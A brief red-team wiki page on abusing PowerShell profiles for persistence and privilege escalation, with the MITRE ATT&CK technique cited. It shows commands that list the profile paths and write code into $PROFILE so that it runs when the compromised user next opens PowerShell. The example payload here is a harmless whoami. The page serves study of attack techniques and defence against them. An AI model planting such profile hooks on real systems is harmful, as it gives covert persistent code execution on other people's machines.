# Powershell Profile Persistence

It's possible to use powershell profiles for persistence and/or privilege escalation.

## Execution

There are four places you can abuse the powershell profile, depending on the privileges you have:

```csharp
$PROFILE | select *
```

![](../../.gitbook/assets/image%20%28223%29.png)

Let's add the code to a `$profile` variable \(that expands to the current user's profile file\) that will get executed the next time the compromised user launches a powershell console:

{% code title="attacker@target" %}
```csharp
echo "whoami > c:\temp\whoami.txt" > $PROFILE
cat $PROFILE
```
{% endcode %}

![](../../.gitbook/assets/image%20%2860%29.png)

Once the compromised user launches powershell, our code gets executed:

![](../../.gitbook/assets/image%20%28380%29.png)

{% hint style="warning" %}
If the user is not using profiles, the technique will stick out immediately due to the "loading personal and system profiles..." message at the top.
{% endhint %}

## References

{% embed url="https://attack.mitre.org/techniques/T1504/" %}

